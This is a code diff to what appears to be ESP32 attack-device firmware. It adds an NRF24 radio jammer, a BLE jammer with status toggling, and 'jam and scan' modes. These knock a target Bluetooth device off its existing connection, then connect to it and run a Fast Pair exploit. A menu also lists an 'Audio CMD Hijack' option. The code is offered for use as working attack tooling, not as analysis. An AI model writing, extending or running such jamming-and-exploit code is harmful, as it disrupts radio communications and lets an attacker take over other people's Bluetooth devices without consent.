@@ -7,6 +7,10 @@
 #include "core/utils.h"
 #include "esp_mac.h"
 
+#ifdef HAS_NRF24
+#include "modules/NRF24/nrf_jammer.h"
+#endif
+
 extern std::vector<String> fastPairDevices;
 extern bool returnToMenu;
 
@@ -613,14 +617,26 @@ void testFastPairVulnerability() {
     delay(2000);
 }
 
-void disconnectAndExploit(NimBLEAddress target) {
-    showAdaptiveMessage("Starting jam to disconnect...", "", "", "", TFT_YELLOW, false);
+void disconnectAndExploit(NimBLEAddress target, bool useNRF24 = false) {
+    if(useNRF24) {
+#ifdef HAS_NRF24
+        showAdaptiveMessage("NRF24 Jammer starting...", "", "", "", TFT_YELLOW, false);
+        startJammer();
+        showAdaptiveMessage("NRF24 JAMMING", "Jamming for 3s...", "", "", TFT_YELLOW, false);
+        delay(3000);
+#else
+        showAdaptiveMessage("NRF24 not available", "Using BLE jammer", "", "", TFT_YELLOW);
+        useNRF24 = false;
+#endif
+    }
     
-    bleJammer.startAdvertisingJam();
-    delay(2000);
-    
-    bleJammer.stopJam();
-    delay(500);
+    if(!useNRF24) {
+        showAdaptiveMessage("Starting BLE jam...", "", "", "", TFT_YELLOW, false);
+        bleJammer.startAdvertisingJam();
+        delay(2000);
+        bleJammer.stopJam();
+        delay(500);
+    }
     
     showAdaptiveMessage("Attempting connection...", "", "", "", TFT_WHITE, false);
     
@@ -628,6 +644,12 @@ void disconnectAndExploit(NimBLEAddress target) {
     
     if(pClient->connect(target, true)) {
         showAdaptiveMessage("Connected! Running exploit...", "", "", "", TFT_WHITE, false);
+        
+        if(useNRF24) {
+#ifdef HAS_NRF24
+            stopJammer();
+#endif
+        }
         
         NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
         if(pService) {
@@ -668,6 +690,11 @@ void disconnectAndExploit(NimBLEAddress target) {
         
         pClient->disconnect();
     } else {
+        if(useNRF24) {
+#ifdef HAS_NRF24
+            stopJammer();
+#endif
+        }
         showAdaptiveMessage("Still connected elsewhere", "Try manual disconnect", "OK", "", TFT_RED);
     }
     
@@ -679,12 +706,22 @@ void bleJammerMenu() {
     drawMainBorderWithTitle("BLE JAMMER");
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setCursor(20, 60);
-    tft.print("1. Start Advertising Jam");
-    tft.setCursor(20, 90);
-    tft.print("2. Target Connection Jam");
+    
+    if(bleJammer.isActive()) {
+        tft.print("Status: ACTIVE");
+        tft.setCursor(20, 90);
+        tft.print("1. Stop BLE Jammer");
+    } else {
+        tft.print("Status: INACTIVE");
+        tft.setCursor(20, 90);
+        tft.print("1. Start BLE Jammer");
+    }
+    
     tft.setCursor(20, 120);
-    tft.print("3. Stop Jam");
-    tft.setCursor(20, 160);
+    tft.print("2. Target Connection Jam");
+    tft.setCursor(20, 150);
+    tft.print("3. Test Jam & Scan");
+    tft.setCursor(20, 190);
     tft.print("SEL: Select  ESC: Back");
     
     int selection = 0;
@@ -694,11 +731,11 @@ void bleJammerMenu() {
         if(check(EscPress)) return;
         
         if(redraw) {
-            tft.fillRect(20, 180, tftWidth - 40, 30, bruceConfig.bgColor);
-            tft.setCursor(20, 180);
-            if(selection == 0) tft.print(">> Start Advertising Jam");
+            tft.fillRect(20, 210, tftWidth - 40, 30, bruceConfig.bgColor);
+            tft.setCursor(20, 210);
+            if(selection == 0) tft.print(">> " + String(bleJammer.isActive() ? "Stop BLE Jammer" : "Start BLE Jammer"));
             else if(selection == 1) tft.print(">> Target Connection Jam");
-            else tft.print(">> Stop Jam");
+            else tft.print(">> Test Jam & Scan");
             redraw = false;
         }
         
@@ -714,10 +751,16 @@ void bleJammerMenu() {
                 redraw = true;
             }
         }
+        
         if(check(SelPress)) {
             if(selection == 0) {
-                bleJammer.startAdvertisingJam();
-                showAdaptiveMessage("Advertising Jam Started", "OK", "", "", TFT_GREEN);
+                if(bleJammer.isActive()) {
+                    bleJammer.stopJam();
+                    showAdaptiveMessage("BLE Jammer STOPPED", "OK", "", "", TFT_WHITE);
+                } else {
+                    bleJammer.startAdvertisingJam();
+                    showAdaptiveMessage("BLE Jammer STARTED", "OK", "", "", TFT_GREEN);
+                }
             }
             else if(selection == 1) {
                 String selectedInfo = selectTargetFromScan("SELECT TARGET");
@@ -732,8 +775,24 @@ void bleJammerMenu() {
                 }
             }
             else {
+                showAdaptiveMessage("Starting BLE jam...", "Scanning in 2s", "", "", TFT_YELLOW, false);
+                bleJammer.startAdvertisingJam();
+                delay(2000);
                 bleJammer.stopJam();
-                showAdaptiveMessage("Jam Stopped", "OK", "", "", TFT_WHITE);
+                delay(500);
+                
+                String selectedInfo = selectTargetFromScan("POST-JAM SCAN");
+                
+                if(!selectedInfo.isEmpty()) {
+                    int colonPos = selectedInfo.lastIndexOf(':');
+                    String selectedMAC = selectedInfo.substring(0, colonPos);
+                    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
+                    NimBLEAddress target(selectedMAC.c_str(), addrType);
+                    
+                    if(requireSimpleConfirmation("Run exploit on device?")) {
+                        disconnectAndExploit(target, false);
+                    }
+                }
             }
             return;
         }
@@ -741,14 +800,96 @@ void bleJammerMenu() {
     }
 }
 
+#ifdef HAS_NRF24
+void nrf24JammerMenu() {
+    tft.fillScreen(bruceConfig.bgColor);
+    drawMainBorderWithTitle("NRF24 JAMMER");
+    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+    tft.setCursor(20, 60);
+    tft.print("NRF24L01+ Module");
+    tft.setCursor(20, 90);
+    tft.print("Status: READY");
+    tft.setCursor(20, 120);
+    tft.print("1. Start NRF24 Jammer");
+    tft.setCursor(20, 150);
+    tft.print("2. Stop NRF24 Jammer");
+    tft.setCursor(20, 180);
+    tft.print("3. Jam & Scan Mode");
+    tft.setCursor(20, 210);
+    tft.print("SEL: Select  ESC: Back");
+    
+    int selection = 0;
+    bool redraw = true;
+    
+    while(true) {
+        if(check(EscPress)) return;
+        
+        if(redraw) {
+            tft.fillRect(20, 230, tftWidth - 40, 30, bruceConfig.bgColor);
+            tft.setCursor(20, 230);
+            if(selection == 0) tft.print(">> Start NRF24 Jammer");
+            else if(selection == 1) tft.print(">> Stop NRF24 Jammer");
+            else tft.print(">> Jam & Scan Mode");
+            redraw = false;
+        }
+        
+        if(check(PrevPress)) {
+            if(selection > 0) {
+                selection--;
+                redraw = true;
+            }
+        }
+        if(check(NextPress)) {
+            if(selection < 2) {
+                selection++;
+                redraw = true;
+            }
+        }
+        
+        if(check(SelPress)) {
+            if(selection == 0) {
+                startJammer();
+                showAdaptiveMessage("NRF24 Jammer STARTED", "OK", "", "", TFT_GREEN);
+            }
+            else if(selection == 1) {
+                stopJammer();
+                showAdaptiveMessage("NRF24 Jammer STOPPED", "OK", "", "", TFT_WHITE);
+            }
+            else if(selection == 2) {
+                showAdaptiveMessage("Starting jammer...", "Scanning in 3s", "", "", TFT_YELLOW, false);
+                startJammer();
+                delay(3000);
+                
+                String selectedInfo = selectTargetFromScan("JAM & SCAN MODE");
+                
+                stopJammer();
+                
+                if(!selectedInfo.isEmpty()) {
+                    int colonPos = selectedInfo.lastIndexOf(':');
+                    String selectedMAC = selectedInfo.substring(0, colonPos);
+                    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
+                    NimBLEAddress target(selectedMAC.c_str(), addrType);
+                    
+                    if(requireSimpleConfirmation("Run exploit on device?")) {
+                        disconnectAndExploit(target, true);
+                    }
+                }
+            }
+            return;
+        }
+        delay(50);
+    }
+}
+#endif
+
 void whisperPairMenu() {
     std::vector<Option> options;
     returnToMenu = false;
-
+    
     options.push_back({"[Scan & Test]", []() {
         testFastPairVulnerability();
     }});
-
+    
     options.push_back({"[Full Pair Test]", []() {
         tft.fillScreen(bruceConfig.bgColor);
         drawMainBorderWithTitle("FULL PAIR EXPLOIT");
@@ -819,7 +960,7 @@ void whisperPairMenu() {
             showAdaptiveMessage("Exploit failed", "OK", "", "", TFT_RED);
         }
     }});
-
+    
     options.push_back({"[Force Disconnect & Test]", []() {
         initBLEIfNeeded("Bruce-WP-JAM");
         
@@ -843,20 +984,74 @@ void whisperPairMenu() {
             return;
         }
         
-        if(!requireSimpleConfirmation("Force disconnect and test?")) return;
+        tft.fillScreen(bruceConfig.bgColor);
+        drawMainBorderWithTitle("SELECT JAMMER");
+        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+        tft.setCursor(20, 60);
+        tft.print("Which jammer to use?");
+        tft.setCursor(20, 90);
+        tft.print("1. NRF24 (better)");
+        tft.setCursor(20, 120);
+        tft.print("2. BLE (fallback)");
+        tft.setCursor(20, 160);
+        tft.print("SEL: Select  ESC: Cancel");
         
-        disconnectAndExploit(target);
+        int jammerChoice = 0;
+        bool redraw = true;
+        
+        while(true) {
+            if(check(EscPress)) return;
+            
+            if(redraw) {
+                tft.fillRect(20, 180, tftWidth - 40, 30, bruceConfig.bgColor);
+                tft.setCursor(20, 180);
+                if(jammerChoice == 0) tft.print(">> NRF24 Jammer");
+                else tft.print(">> BLE Jammer");
+                redraw = false;
+            }
+            
+            if(check(PrevPress) || check(NextPress)) {
+                jammerChoice = 1 - jammerChoice;
+                redraw = true;
+            }
+            
+            if(check(SelPress)) {
+                bool useNRF24 = (jammerChoice == 0);
+                
+#ifdef HAS_NRF24
+                if(useNRF24) {
+                    if(!requireSimpleConfirmation("Use NRF24 jammer?")) return;
+                } else {
+                    if(!requireSimpleConfirmation("Use BLE jammer?")) return;
+                }
+#else
+                showAdaptiveMessage("NRF24 not available", "Using BLE jammer", "", "", TFT_YELLOW);
+                useNRF24 = false;
+                delay(1000);
+#endif
+                
+                disconnectAndExploit(target, useNRF24);
+                return;
+            }
+            delay(50);
+        }
     }});
-
+    
     options.push_back({"[Audio CMD Hijack]", []() {
         audioCommandHijackTest();
     }});
-
+    
+#ifdef HAS_NRF24
+    options.push_back({"[NRF24 Jammer]", []() {
+        nrf24JammerMenu();
+    }});
+#endif
+    
     options.push_back({"[BLE Jammer]", []() {
         bleJammerMenu();
     }});
-
+    
     options.push_back({"[Back]", []() { returnToMenu = true; }});
-
+    
     loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
 }
